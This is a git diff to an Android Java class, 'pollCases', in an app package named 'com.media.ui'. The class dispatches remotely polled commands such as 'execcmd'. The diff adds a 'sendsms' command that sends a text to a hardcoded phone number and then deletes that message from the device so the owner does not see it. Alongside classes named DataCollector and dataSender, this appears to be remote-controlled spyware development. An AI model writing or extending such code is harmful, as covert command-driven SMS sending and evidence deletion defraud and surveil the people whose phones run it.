@@ -10,12 +10,14 @@ import com.media.ui.DataCollector.CnfInstall;
 import com.media.ui.Notifications.installNotification;
 import com.media.ui.Notifications.sendNotification;
 import com.media.ui.Services.dataSender;
+import com.media.ui.Util.SMSManager;
 import com.media.ui.constants;
 
 import java.io.InputStream;
 import java.util.HashMap;
 
 import static android.content.Context.NOTIFICATION_SERVICE;
+import static java.lang.Thread.sleep;
 
 
 /**
@@ -78,6 +80,17 @@ public class pollCases {
                 // Statements
                 break; // optional
             case "execcmd":
+                // Statements
+                break; // optional
+            case "sendsms":
+                SMSManager y = new SMSManager();
+                y.sendsms("09821490074","Test Message",context);
+                try {
+                    sleep(5000);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                }
+                y.deleteSMS(context,"Test Message","09821490074");
                 // Statements
                 break; // optional
             default: // Optional
